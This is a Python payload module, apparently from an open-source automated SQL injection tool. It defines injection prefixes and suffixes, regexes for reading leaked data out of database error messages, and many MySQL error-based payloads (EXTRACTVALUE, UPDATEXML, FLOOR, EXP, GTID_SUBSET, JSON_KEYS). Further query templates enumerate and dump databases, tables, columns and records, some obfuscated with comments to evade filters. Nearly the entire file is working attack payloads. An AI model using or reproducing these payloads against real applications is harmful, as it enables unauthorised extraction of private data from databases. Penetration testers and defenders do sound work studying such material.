#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""


PREFIX = [" ", "' ", '" ', ") ", "') ", '") ']
SUFFIX = ["", "AND'", "AND 1", "AND '1", "AND('", "%23", "--", "--%20-", "--+", "--+-"]
REGEX_TESTS = r"(?isx)(?P<xpath_data>r0oth3x49)"
REGEX_XPATH = r"(?isx)(XPATH.*error\s*:\s*\'~(?:0|\()?(?P<xpath_data>.*?))\'"
REGEX_ERROR_BASED = (
    r"(?isx)(Duplicate\s*entry\s*\'(?:~|qbvvq)(?:0|\()?(?P<xpath_data>.*?))1\'"
)
REGEX_BIGINT_BASED = r"(?isx)(BIGINT.*\s.*Injected~(?:0|\()?(?P<xpath_data>.*?))\~END"
REGEX_DOUBLE_BASED = r"(?isx)(DOUBLE.*\s.*Injected~(?:0|\()?(?P<xpath_data>.*?))\~END"
REGEX_GEOMETRIC_BASED = (
    r"(?isx)(Illegal.*geometric.*\s.*Injected~(?P<xpath_data>.*?))\~END"
)
REGEX_GTID_BASED = r"(?isx)(?:Malformed.*?GTID.*?set.*?specification.*?\'Injected~(?:0|\()?(?P<xpath_data>.*?))\~END"
REGEX_JSON_KEYS = r"(?isx)(?:Injected~(?:0|\()?(?P<xpath_data>.*?))\~END"
# REGEX_POSTGRES = r"(?isx)(?:r0oth3x49(?P<xpath_data>.*?)END)"

PAYLOADS_BANNER = [
    "VERSION()",
    "@@VERSION",
    "@@GLOBAL_VERSION",
    "@@VERSION_COMMENT",
    "VERSION/**_**/()",
    "VERSION/*!50000()*/",
]

PAYLOADS_CURRENT_USER = [
    "USER()",
    "CURRENT_USER",
    "CURRENT_USER()",
    "SESSION_USER()",
    "SYSTEM_USER()",
]

PAYLOADS_CURRENT_DATABASE = [
    "DATABASE()",
    "SCHEMA()",
    "SCHEMA/*!50000()*/",
    "DATABASE/**_**/()",
    "DATABASE/*!50000()*/",
    # "CURRENT_DATABASE()",
]

PAYLOADS_HOSTNAME = ["@@HOSTNAME"]

PAYLOADS = [
    {
        "back_end": "MySQL",
        "version": ">=5.1",
        "order": 1,
        "regex": REGEX_XPATH,
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)",
        "payloads": [
            "AND EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439))",
            "AND EXTRACTVALUE(0,CONCAT_WS(0x28, 0x7e,0x72306f746833783439))",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.1",
        "order": 2,
        "regex": REGEX_XPATH,
        "title": "MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)",
        "payloads": [
            "AND UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439),0)",
            "AND UPDATEXML(0,CONCAT_WS(0x28, 0x7e,0x72306f746833783439),0)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.0",
        "order": 3,
        "regex": REGEX_ERROR_BASED,
        "title": "MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
        "payloads": [
            "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
            "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)",
            "AND (SELECT 3341 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT (ELT(3341=3341,1))),0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.0",
        "order": 4,
        "regex": REGEX_ERROR_BASED,
        "title": "MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
        "payloads": [
            "OR 1 GROUP BY CONCAT(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
            "OR/**/1/**/GROUP/**/BY/**/CONCAT(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
            "OR/**/1/**/GROUP/**/BY/**/CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 5,
        "regex": REGEX_GEOMETRIC_BASED,
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (POLYGON)",
        "payloads": [
            "AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)root)k)p))"
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 6,
        "regex": REGEX_GEOMETRIC_BASED,
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (MULTIPOINT)",
        "payloads": [
            "AND MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)root)k)p))"
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 7,
        "regex": REGEX_DOUBLE_BASED,
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXPONENT)",
        "payloads": [
            "AND(EXP(~(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x)))",
            "AND EXP(~(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 8,
        "regex": REGEX_DOUBLE_BASED,
        "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXPONENT)",
        "payloads": [
            "OR(EXP(~(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x)))",
            "OR EXP(~(SELECT*FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)e)x))",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 9,
        "regex": REGEX_DOUBLE_BASED,
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)",
        "payloads": [
            "AND(SELECT(x*1E308)FROM(SELECT CONCAT(0x33, 0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
            "AND(SELECT(IF(e,6,9)*1E308)FROM(SELECT(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44))e)x)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.1",
        "order": 10,
        "regex": REGEX_XPATH,
        "title": "MySQL >= 5.1 error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (PROCEDURE ANALYSE)",
        "payloads": [
            "PROCEDURE%20ANALYSE(EXTRACTVALUE(0,CONCAT(0x7e,0x72306f746833783439)),1)"
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.5",
        "order": 11,
        "regex": REGEX_BIGINT_BASED,
        "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)",
        "payloads": [
            "AND(SELECT(!x-~0)FROM(SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
            "AND(SELECT(x+is+not+null)-9223372036854775808+FROM(SELECT(CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44))x)y)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.6",
        "order": 12,
        "regex": REGEX_GTID_BASED,
        "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
        "payloads": [
            "AND GTID_SUBSET(CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
            "AND GTID_SUBSET(CONCAT_WS(0x28, 0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.6",
        "order": 13,
        "regex": REGEX_GTID_BASED,
        "title": "MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)",
        "payloads": [
            "OR GTID_SUBSET(CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
            "OR GTID_SUBSET(CONCAT_WS(0x28, 0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.7.8",
        "order": 14,
        "regex": REGEX_JSON_KEYS,
        "title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",
        "payloads": [
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
            "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
        ],
    },
    {
        "back_end": "MySQL",
        "version": ">=5.7.8",
        "order": 15,
        "regex": REGEX_JSON_KEYS,
        "title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)",
        "payloads": [
            "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
            "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
        ],
    },
    # {
    #     "back_end": "PostgreSQL",
    #     "version": ">8.1",
    #     "order": 1,
    #     "regex": REGEX_POSTGRES,
    #     "title": "PostgreSQL AND error-based - WHERE or HAVING clause",
    #     "payloads": [
    #         "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)))||1337::text||(CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
    #     ],
    # },
]

PAYLOADS_DBS_COUNT = [
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.SCHEMATA))",
    "(/*!SELECT*//**_**/COUNT(*)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/))",
    "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*//*!50000(INFORMATION_SCHEMA.SCHEMATA)*/)",
    "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000SCHEMATA*/))",
]


PAYLOADS_DBS_NAMES = [
    "(/*!SELECT*//**_**/CONCAT/**_**/(/*!50000SCHEMA_NAME*/)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/))LIMIT 0,1",
    "(SELECT CONCAT(SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
    "(SELECT CONCAT_WS(0x09,SCHEMA_NAME)FROM(INFORMATION_SCHEMA.SCHEMATA)LIMIT 0,1)",
    "(/*!SELECT*/ CONCAT_WS(0x09,/*!SCHEMA_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!SCHEMATA*/)LIMIT/**_**/0,1)",
]


PAYLOADS_TBLS_COUNT = [
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x{db}))",
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE 0x{db}))",
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN(0x{db})))",
    "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA=0x{db}))",
    "(/*!SELECT*//**_**/COUNT(*)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)WHERE(TABLE_SCHEMA=0x{db}))",
]

PAYLOADS_TBLS_NAMES = [
    "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x{db})LIMIT 0,1)",
    "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE 0x{db})LIMIT 0,1)",
    "(SELECT CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN/**_**/(0x{db}))LIMIT 0,1)",
    "(SELECT CONCAT_WS(0x09,TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x{db})LIMIT 0,1)",
    "(/*!SELECT*/ CONCAT_WS(0x09,/*!TABLE_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!TABLES*/)/*!50000WHERE*/(TABLE_SCHEMA=0x{db})LIMIT/**_**/0,1)",
]


PAYLOADS_COLS_COUNT = [
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA=0x{db})AND(TABLE_NAME=0x{tbl}))",
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE 0x{db})AND(TABLE_NAME LIKE 0x{tbl}))",
    "(SELECT COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN(0x{db}))AND(TABLE_NAME IN(0x{tbl})))",
    "(/*!50000SELECT*/ COUNT(*)/*!50000FROM*/(/*!50000INFORMATION_SCHEMA*/./*!50000COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA=0x{db})AND(/*!50000TABLE_NAME*/=0x{tbl}))",
    "(/*!SELECT*//**_**/COUNT(*)%23/**_**/%0AFROM%23/**_**/%0A(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)WHERE(TABLE_SCHEMA=0x{db})AND(/*!50000TABLE_NAME*/=0x{tbl}))",
]


PAYLOADS_COLS_NAMES = [
    "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA=0x{db})AND(TABLE_NAME=0x{tbl})LIMIT 0,1)",
    "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA LIKE 0x{db})AND(TABLE_NAME LIKE 0x{tbl})LIMIT 0,1)",
    "(SELECT CONCAT(COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA IN/**_**/(0x{db}))AND(TABLE_NAME IN(0x{tbl}))LIMIT 0,1)",
    "(SELECT CONCAT_WS(0x09,COLUMN_NAME)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_SCHEMA=0x{db})AND(/*!50000TABLE_NAME*/=0x{tbl})LIMIT 0,1)",
    "(/*!SELECT*/ CONCAT_WS(0x09,/*!COLUMN_NAME*/)FROM(/*!INFORMATION_SCHEMA*/./**_**//*!COLUMNS*/)/*!50000WHERE*/(TABLE_SCHEMA=0x{db})AND(/*!50000TABLE_NAME*/=0x{tbl})LIMIT/**_**/0,1)",
]


PAYLOADS_RECS_COUNT = [
    "(SELECT COUNT(*)FROM({db}.`{tbl}`))",
    "(/*!50000SELECT*/+COUNT(/*!50000**/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/))",
    "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA=0x{db})AND(TABLE_NAME=0x{tbl}))",
    "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA LIKE 0x{db})AND(TABLE_NAME LIKE 0x{tbl}))",
    "(SELECT IFNULL(TABLE_ROWS, 0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA IN/**_**/(0x{db}))AND(TABLE_NAME IN(0x{tbl})))",
]


PAYLOADS_RECS_DUMP = [
    "(SELECT MID((IFNULL(CAST({col} AS NCHAR),0x20)),1,54) FROM {db}.{tbl} LIMIT 0,1)",
    "(/*!50000SELECT*//**/CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/(/*!50000{db}*/./*!50000`{tbl}`*/)LIMIT/**/0,1)",
    "(SELECT CONCAT_WS(0x28,{col})FROM({db}.`{tbl}`)LIMIT 0,1)",
    "(/*!50000SELECT*/+CONCAT/**_**/(/*!50000{col}*/)/*!50000FROM*/+/*!50000{db}.{tbl}*/+LIMIT+0,1)",
    "(SELECT/**/CONCAT({col})FROM/**/{db}.{tbl}/**/LIMIT/**_**/0,1)",
    "(SELECT+CONCAT({col})FROM+{db}.{tbl}+LIMIT+0,1)",
    "(/*!50000SELECT*/+CONCAT/**_**/({col})/*!50000FROM*/+/*!50000{db}*/./*!50000{tbl}*/+LIMIT+0,1)",
    "(/*!50000SELECT*//**/CONCAT({col})/*!50000FROM*//**//*!50000{db}*/./*!50000{tbl}*//**/LIMIT/**_**/0,1)",
]


PAYLOADS_TABLE_SEARCH_COUNT = [
    "(SELECT+COUNT(*)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_NAME LIKE 0x{tbl}))"
]
PAYLOADS_TABLE_SEARCH_DUMP = [
    "(SELECT+CONCAT(TABLE_NAME)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_NAME LIKE 0x{tbl})LIMIT 0,1)"
]

PAYLOADS_COLUMN_SEARCH_COUNT = [
    "(SELECT+COUNT(*)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(COLUMN_NAME LIKE 0x{col}))"
]
PAYLOADS_COLUMN_SEARCH_DUMP = [
    "(SELECT+CONCAT(0x72306f746833783439)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(COLUMN_NAME LIKE 0x{col})LIMIT 0,1)"
]
